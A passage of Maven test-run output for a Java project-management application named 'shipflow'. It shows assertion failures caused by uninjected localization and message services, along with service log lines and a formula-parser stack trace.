	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerServiceTest.shouldFailWhenNoPitchOrTask(WorkLogTimerServiceTest.java:168)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerServiceTest.shouldFailWhenBothPitchAndTask -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  com.github.farzadsedaghatbin.shipflow.exception.BadRequestException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerService.startTimer(WorkLogTimerService.java:40)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerServiceTest.lambda$shouldFailWhenBothPitchAndTask$1(WorkLogTimerServiceTest.java:182)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerServiceTest.shouldFailWhenBothPitchAndTask(WorkLogTimerServiceTest.java:183)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.BugReportTraceabilityTest
2026-01-17T23:26:54.465Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.BugReportService  : Updated bug report: BUG-001 by user: 1
2026-01-17T23:26:54.466Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.BugReportService  : Created bug report: BUG-002 by user: 1
2026-01-17T23:26:54.468Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.BugReportService  : Created bug report: BUG-001 by user: 1
2026-01-17T23:26:54.468Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.BugReportService  : Created bug report: BUG-003 by user: 1
[INFO] Tests run: 6, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.005 s -- in com.github.farzadsedaghatbin.shipflow.service.BugReportTraceabilityTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.HillChartServiceTest
[INFO] Tests run: 9, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.003 s -- in com.github.farzadsedaghatbin.shipflow.service.HillChartServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest
[ERROR] Tests run: 15, Failures: 7, Errors: 0, Skipped: 0, Time elapsed: 0.013 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest
[ERROR] com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.addDependency_CircularDependency_ThrowsException -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  com.github.farzadsedaghatbin.shipflow.exception.BadRequestException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyService.addDependency(TaskDependencyService.java:61)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.lambda$addDependency_CircularDependency_ThrowsException$5(TaskDependencyServiceTest.java:232)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.addDependency_CircularDependency_ThrowsException(TaskDependencyServiceTest.java:233)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.addDependency_SelfDependency_ThrowsException -- Time elapsed: 0 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  com.github.farzadsedaghatbin.shipflow.exception.BadRequestException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyService.addDependency(TaskDependencyService.java:51)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.lambda$addDependency_SelfDependency_ThrowsException$3(TaskDependencyServiceTest.java:185)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.addDependency_SelfDependency_ThrowsException(TaskDependencyServiceTest.java:186)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.removeDependency_NotFound_ThrowsException -- Time elapsed: 0 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyService.removeDependency(TaskDependencyService.java:80)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.lambda$removeDependency_NotFound_ThrowsException$6(TaskDependencyServiceTest.java:275)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.removeDependency_NotFound_ThrowsException(TaskDependencyServiceTest.java:276)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.addDependency_ComplexCircularDependency_ThrowsException -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  com.github.farzadsedaghatbin.shipflow.exception.BadRequestException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyService.addDependency(TaskDependencyService.java:61)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.lambda$addDependency_ComplexCircularDependency_ThrowsException$8(TaskDependencyServiceTest.java:401)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.addDependency_ComplexCircularDependency_ThrowsException(TaskDependencyServiceTest.java:402)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.addDependency_DuplicateDependency_ThrowsException -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  com.github.farzadsedaghatbin.shipflow.exception.BadRequestException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyService.addDependency(TaskDependencyService.java:56)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.lambda$addDependency_DuplicateDependency_ThrowsException$4(TaskDependencyServiceTest.java:204)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.addDependency_DuplicateDependency_ThrowsException(TaskDependencyServiceTest.java:205)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.addDependency_TasksInDifferentCycles_ThrowsException -- Time elapsed: 0 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  com.github.farzadsedaghatbin.shipflow.exception.BadRequestException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyService.addDependency(TaskDependencyService.java:46)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.lambda$addDependency_TasksInDifferentCycles_ThrowsException$2(TaskDependencyServiceTest.java:169)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.addDependency_TasksInDifferentCycles_ThrowsException(TaskDependencyServiceTest.java:170)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.getDependenciesForTask_TaskNotFound_ThrowsException -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyService.getDependenciesForTask(TaskDependencyService.java:90)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.lambda$getDependenciesForTask_TaskNotFound_ThrowsException$7(TaskDependencyServiceTest.java:322)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.TaskDependencyServiceTest.getDependenciesForTask_TaskNotFound_ThrowsException(TaskDependencyServiceTest.java:323)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.ProjectServiceTest
[ERROR] Tests run: 11, Failures: 2, Errors: 0, Skipped: 0, Time elapsed: 0.005 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.ProjectServiceTest
[ERROR] com.github.farzadsedaghatbin.shipflow.service.ProjectServiceTest.create_WithDuplicateKey_ShouldThrowException -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.ProjectService.create(ProjectService.java:58)
	at com.github.farzadsedaghatbin.shipflow.service.ProjectServiceTest.lambda$create_WithDuplicateKey_ShouldThrowException$1(ProjectServiceTest.java:156)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.ProjectServiceTest.create_WithDuplicateKey_ShouldThrowException(ProjectServiceTest.java:157)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.ProjectServiceTest.delete_WhenHasCycles_ShouldThrowException -- Time elapsed: 0 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.ProjectService.delete(ProjectService.java:136)
	at com.github.farzadsedaghatbin.shipflow.service.ProjectServiceTest.lambda$delete_WhenHasCycles_ShouldThrowException$2(ProjectServiceTest.java:211)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.ProjectServiceTest.delete_WhenHasCycles_ShouldThrowException(ProjectServiceTest.java:212)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.TeamServiceTest
[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.003 s -- in com.github.farzadsedaghatbin.shipflow.service.TeamServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.DashboardNotificationServiceTest
2026-01-17T23:26:54.553Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Starting daily notification generation
2026-01-17T23:26:54.553Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Generated 1 overdue task notifications
2026-01-17T23:26:54.553Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Generated 0 blocked task notifications
2026-01-17T23:26:54.553Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Generated cycle deadline notifications for 0 cycles
2026-01-17T23:26:54.553Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Generated stalled hill chart notifications for 0 points
2026-01-17T23:26:54.553Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Cleaned up 0 expired notifications
2026-01-17T23:26:54.553Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Completed daily notification generation
2026-01-17T23:26:54.554Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Created cycle phase change notifications for cycle 1 (BUILD→COOLDOWN) - 2 users notified
2026-01-17T23:26:54.555Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Created cycle phase change notifications for cycle 1 (BUILD→COOLDOWN) - 0 users notified
2026-01-17T23:26:54.556Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Created circuit breaker triggered notifications for pitch 1 (2 team members, Slack sent)
2026-01-17T23:26:54.557Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Marked 2 notifications as read for user 1
2026-01-17T23:26:54.558Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Cleaned up 1 expired notifications
2026-01-17T23:26:54.561Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Pitch 1 has no team assigned - sending Slack notification only
2026-01-17T23:26:54.561Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Created circuit breaker triggered notifications for pitch 1 (0 team members, Slack sent)
2026-01-17T23:26:54.561Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Created pitch killed notifications for pitch 1 (2 team members, Slack sent)
2026-01-17T23:26:54.562Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Starting daily notification generation
2026-01-17T23:26:54.562Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Generated 1 overdue task notifications
2026-01-17T23:26:54.562Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Generated 1 blocked task notifications
2026-01-17T23:26:54.562Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Generated cycle deadline notifications for 0 cycles
2026-01-17T23:26:54.562Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Generated stalled hill chart notifications for 0 points
2026-01-17T23:26:54.562Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Cleaned up 0 expired notifications
2026-01-17T23:26:54.562Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Completed daily notification generation
2026-01-17T23:26:54.562Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Pitch 1 has no team assigned - sending Slack notification only
2026-01-17T23:26:54.563Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Created pitch killed notifications for pitch 1 (0 team members, Slack sent)
[INFO] Tests run: 18, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.070 s -- in com.github.farzadsedaghatbin.shipflow.service.DashboardNotificationServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.WorkLogServiceTest
[ERROR] Tests run: 12, Failures: 2, Errors: 0, Skipped: 0, Time elapsed: 0.064 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.WorkLogServiceTest
[ERROR] com.github.farzadsedaghatbin.shipflow.service.WorkLogServiceTest.createWorkLog_WithoutPitchOrTask_ShouldThrowException -- Time elapsed: 0 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogService.createWorkLog(WorkLogService.java:92)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogServiceTest.lambda$createWorkLog_WithoutPitchOrTask_ShouldThrowException$1(WorkLogServiceTest.java:218)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogServiceTest.createWorkLog_WithoutPitchOrTask_ShouldThrowException(WorkLogServiceTest.java:219)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.WorkLogServiceTest.createWorkLog_WithBothPitchAndTask_ShouldThrowException -- Time elapsed: 0 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogService.createWorkLog(WorkLogService.java:92)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogServiceTest.lambda$createWorkLog_WithBothPitchAndTask_ShouldThrowException$2(WorkLogServiceTest.java:232)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogServiceTest.createWorkLog_WithBothPitchAndTask_ShouldThrowException(WorkLogServiceTest.java:233)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.EvidenceServiceTest
[INFO] Tests run: 8, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.060 s -- in com.github.farzadsedaghatbin.shipflow.service.EvidenceServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParserTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParserTest$EdgeCasesTests
2026-01-17T23:26:54.689Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.service.MetricFormulaParser      : Formula evaluation failed: 10 + $20

java.lang.RuntimeException: Unexpected: $
	at com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParser$ExpressionEvaluator.parseFactor(MetricFormulaParser.java:267) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParser$ExpressionEvaluator.parseTerm(MetricFormulaParser.java:240) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParser$ExpressionEvaluator.parseExpression(MetricFormulaParser.java:233) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParser$ExpressionEvaluator.evaluate(MetricFormulaParser.java:225) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParser.evaluateMathExpression(MetricFormulaParser.java:195) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParser.evaluateFormula(MetricFormulaParser.java:86) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParserTest$EdgeCasesTests.lambda$0(MetricFormulaParserTest.java:399) ~[test-classes/:na]
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:53) ~[junit-jupiter-api-5.10.1.jar:5.10.1]
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:35) ~[junit-jupiter-api-5.10.1.jar:5.10.1]
	at org.junit.jupiter.api.Assertions.assertThrows(Assertions.java:3115) ~[junit-jupiter-api-5.10.1.jar:5.10.1]
	at com.github.farzadsedaghatbin.shipflow.service.MetricFormulaParserTest$EdgeCasesTests.throwExceptionForInvalidCharacters(MetricFormulaParserTest.java:398) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
